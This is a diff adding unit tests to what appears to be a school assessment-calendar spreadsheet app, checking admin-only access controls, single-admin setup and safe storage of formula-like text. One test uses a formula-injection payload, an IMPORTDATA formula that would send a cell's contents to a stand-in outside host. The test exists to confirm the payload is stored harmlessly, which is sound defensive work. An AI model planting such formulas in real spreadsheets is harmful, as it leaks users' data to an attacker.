@@ -313,3 +313,36 @@ test('unexpected server errors come back as a plain message', () => {
   assert.equal(res.error.code, 'ERROR');
   assert.doesNotMatch(res.error.message, /boom/);
 });
+
+test('menu items and triggers refuse anyone calling them through the web app', () => {
+  const t = fresh({ user: 'tl.head@school.example' });
+  t.svc.state.owner = 'admin@school.example';
+  assert.throws(() => g.requireAdminCaller_(), /Only admins/);          // SLT is not ADMIN
+  t.as(t.fx.people.student);
+  assert.throws(() => g.cronHourly(), /Only admins/);
+  assert.throws(() => g.menuSetup(), /Only admins/);
+  assert.equal(t.backend.objects('Staff').some((r) => r.email === t.fx.people.student), false);
+  t.as('admin@school.example');
+  assert.doesNotThrow(() => g.requireAdminCaller_());                  // the deployer
+  t.svc.state.owner = 'someone.else@school.example';
+  assert.doesNotThrow(() => g.requireAdminCaller_());                  // an ADMIN in the Staff tab
+  t.as('');
+  assert.doesNotThrow(() => g.requireAdminCaller_());                  // a trigger (no active user)
+});
+
+test('Set up never makes a second person ADMIN', () => {
+  const t = fresh({ user: 'tl.head@school.example', sync: false });
+  t.svc.state.owner = 'tl.head@school.example';
+  g.Setup.run();
+  const admins = t.backend.objects('Staff').filter((r) => r.role === 'ADMIN').map((r) => r.email);
+  assert.deepEqual(admins, ['admin@school.example']);
+});
+
+test('text that looks like a formula is stored as text', () => {
+  const t = fresh();
+  const res = call(g, 'apiCreate', draft(t, 'B09BIO', '2026-10-27', { title: '=IMPORTDATA("https://x.example/?"&A2)' }));
+  assert.equal(res.ok, true, JSON.stringify(res.error));
+  const row = t.backend.objects('Assessments').find((r) => r.id === res.data.entries[0].id);
+  assert.equal(row.title, '=IMPORTDATA("https://x.example/?"&A2)');
+  assert.equal(g.Store.headers('Assessments').length > 0, true);
+});
